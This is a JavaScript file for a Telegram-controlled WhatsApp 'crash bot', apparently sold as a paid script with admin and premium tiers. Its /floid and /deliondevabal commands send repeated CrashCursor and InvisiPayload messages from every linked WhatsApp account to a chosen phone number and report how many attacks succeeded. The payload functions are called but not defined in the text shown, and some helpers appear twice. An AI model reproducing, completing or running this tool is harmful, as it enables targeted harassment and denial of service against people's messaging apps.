const config = require("./config.js");
const setup = require("./setupbot.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const moment = require("moment-timezone");
const axios = require("axios");

const token = setup.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const PREM_DB_FILE = "./database/premium.json";
const ADMIN_DB_FILE = "./database/admin.json";

const START_IMAGE_URL = "https://a.top4top.io/p_33121s9za1.jpg";

function readDatabase(filePath) {
  try {
    if (fs.existsSync(filePath)) {
      return JSON.parse(fs.readFileSync(filePath));
    }
    return {};
  } catch (error) {
    console.error(`Error reading database from ${filePath}:`, error);
    return {};
  }
}

function writeDatabase(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error(`Error writing database to ${filePath}:`, error);
  }
}

let premiumDB = readDatabase(PREM_DB_FILE);
let adminDB = readDatabase(ADMIN_DB_FILE);
let modDB = {};

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

{}

//Multi Sender
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
  console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ DIFFUSION PRINCEDX
┣━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CREATED BY DELIONDX
┃ THANKS FOR BUYYING MY SCRIPT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);

  await initializeWhatsAppConnections();
}

initializeBot();

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// Fungsi untuk mengecek apakah user adalah admin
function isAdmin(userId) {
  return adminDB[userId] === true;
}

// Fungsi untuk mengecek apakah user adalah moderator
function isModerator(userId) {
  return modDB.moderators && modDB.moderators.includes(userId);
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// Fungsi untuk mengecek apakah user adalah admin
function isAdmin(userId) {
  return adminDB[userId] === true;
}

// Fungsi untuk mengecek apakah user adalah moderator
function isModerator(userId) {
  return modDB.moderators && modDB.moderators.includes(userId);
}

//--------------- PESAN START DENGAN GAMBAR DAN MENU ---------------
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const totalBot = sessions.size;

  const ownerStatus = isOwner(userId) ? "✅" : "❌";
  const modStatus = isModerator(userId) ? "✅" : "❌";
  try {
    const imageUrl = START_IMAGE_URL;
    const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
    const imageBuffer = Buffer.from(response.data, "binary");

    const menu = `
╭━━━━[ 𝗣𝗥𝗜𝗡𝗖𝗘𝗗𝗫 X ALKAXNAY ]
┃ ⚅ *Developer* : *@AlkanjutNew*
┃ ⚅ *Version* : Limitless
┃ ⚅ *Total bot* : ${totalBot}
┃ ⚅ *Moderator* : ${modStatus}
┃ ⚅ *Owner* : ${ownerStatus}
┃
┃ *LIMITLESS CMD*
┃  /floid - *limitless edition*
┃  /deliondevabal" - *crash beta*
┃
┃ *OWNER PRINCE*
┃  /addbot - *connect bot*
┃  /listbot - *list of bot*
┃  /addadmin - *admin user*
┃  /deladmin - *remove admin*
┃  /addmod - *add moderator*
┃  /delmod - *remove moderator*
┃
┃ *ADMIN PRINCE*
┃  /addprem - *add to prem db*
┃  /delprem - *remove prem*
┃  /cekprem - *remove prem*
┃
┃ *MODERATOR PRINCE*
┃  /addtoken - *acces script*
┃  /deltoken - *remove acces*
┃  /listtoken - *list acces*
╰━━━━━━━━━━━━━━━━━━━━━━━━━❍`;
    await bot.sendPhoto(chatId, imageBuffer, {
      caption: menu,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error("Error sending start message with image and menu:", error);
    bot.sendMessage(
      chatId,
      `👋 Halo, ${msg.from.username}! Selamat datang bot ini. (Gagal memuat gambar dan menu)`
    );
  }
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});
//-------------- FITUR ADMIN --------------

// Fungsi untuk menambahkan admin
bot.onText(/\/addadmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  adminDB[userId] = true;
  writeDatabase(ADMIN_DB_FILE, adminDB);
  bot.sendMessage(chatId, `✅ Berhasil menambahkan ${userId} sebagai admin.`);
});

// Fungsi untuk menghapus admin
bot.onText(/\/deladmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  if (adminDB[userId]) {
    delete adminDB[userId];
    writeDatabase(ADMIN_DB_FILE, adminDB);
    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ${userId} dari daftar admin.`
    );
  } else {
    bot.sendMessage(chatId, `❌ ${userId} tidak terdaftar sebagai admin.`);
  }
});

//-------------- FITUR PREMIUM --------------

// Fungsi untuk menambahkan user premium
bot.onText(/\/addprem (\d+) (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isAdmin(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  const days = parseInt(match[2]);
  const expirationDate = moment().add(days, "days").tz("Asia/Jakarta"); // Menambahkan waktu kadaluarsa

  premiumDB[userId] = {
    expired: expirationDate.format(),
  };
  writeDatabase(PREM_DB_FILE, premiumDB);

  bot.sendMessage(
    chatId,
    `✅ Berhasil menambahkan ${userId} sebagai user premium hingga ${expirationDate.format(
      "DD-MM-YYYY HH:mm:ss"
    )}`
  );
});

// Fungsi untuk menghapus user premium
bot.onText(/\/delprem (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isAdmin(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  if (premiumDB[userId]) {
    delete premiumDB[userId];
    writeDatabase(PREM_DB_FILE, premiumDB);
    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ${userId} dari daftar user premium.`
    );
  } else {
    bot.sendMessage(
      chatId,
      `❌ ${userId} tidak terdaftar sebagai user premium.`
    );
  }
});

// Fungsi untuk mengecek status premium
bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  if (premiumDB[userId]) {
    const expirationDate = moment(premiumDB[userId].expired);
    if (expirationDate.isAfter(moment())) {
      bot.sendMessage(
        chatId,
        `✅ Anda adalah user premium hingga ${expirationDate.format(
          "DD-MM-YYYY HH:mm:ss"
        )}`
      );
    } else {
      delete premiumDB[userId];
      writeDatabase(PREM_DB_FILE, premiumDB);
      bot.sendMessage(chatId, `❌ Status premium Anda telah kadaluarsa.`);
    }
  } else {
    bot.sendMessage(chatId, `❌ Anda bukan user premium.`);
  }
});

//--------------- FITUR TOKEN ---------------



//--------------- LISTBOT ---------------
bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah user adalah owner, admin, atau moderator
  if (
    !isOwner(msg.from.id) &&
    !isAdmin(msg.from.id) &&
    !isModerator(msg.from.id)
  ) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let index = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${index}. ${botNumber}\n`;
      index++;
    }

    bot.sendMessage(
      chatId,
      `*Daftar Bot WhatsApp yang Terhubung:*\n${botList}`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/send (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const [targetNumber, ...messageWords] = match[1].split(" ");
  const message = messageWords.join(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    await sock.sendMessage(`${formattedNumber}@s.whatsapp.net`, {
      text: message || "Hello",
    });

    await bot.sendMessage(chatId, "Pesan berhasil dikirim!");
  } catch (error) {
    console.error("Error in send:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.onText(/\/floid (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber, ...messageWords] = match[1].split(" ");
  const message = messageWords.join(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `TARGET : ${formattedNumber}\nTOTALBOT ${sessions.size}`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 2; i++) {
        await CrashCursor(sock, target);
        await InvisiPayload(sock, target);
        await InvisiPayload(sock, target);
        await CrashCursor(sock, target);
  }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃      *DIFFUSION REPORT*
┣━━━━━━━━━━━━━━━━━━━━━
┃*⌬* *TARGET* *:* *${formattedNumber}*
┃*⌬* *TYPE* *:* *CRASH BETA*
┃*⌬* *SUCCES* *:* *${successCount}*
┃*⌬* *FAILED* *:* *${failCount}*
┃*⌬* *TOTAL NUMBER* *:* *${sessions.size}*
┗━━━━━━━━━━━━━━━━━━━━━`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.onText(/\/deliondevabal" (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber, ...messageWords] = match[1].split(" ");
  const message = messageWords.join(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `TARGET : ${formattedNumber}\nTOTALBOT ${sessions.size}`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 4; i++) {
        await CrashCursor(sock, target);
        await InvisiPayload(sock, target);
        await InvisiPayload(sock, target);
        await CrashCursor(sock, target);
  }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃      *DIFFUSION REPORT*
┣━━━━━━━━━━━━━━━━━━━━━
┃*⌬* *TARGET* *:* *${formattedNumber}*
┃*⌬* *TYPE* *:* *$INVISIPAYLOAD*
┃*⌬* *SUCCES* *:* *${successCount}*
┃*⌬* *FAILED* *:* *${failCount}*
┃*⌬* *TOTAL NUMBER* *:* *${sessions.size}*
┗━━━━━━━━━━━━━━━━━━━━━`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

console.log("Bot telah dimulai...");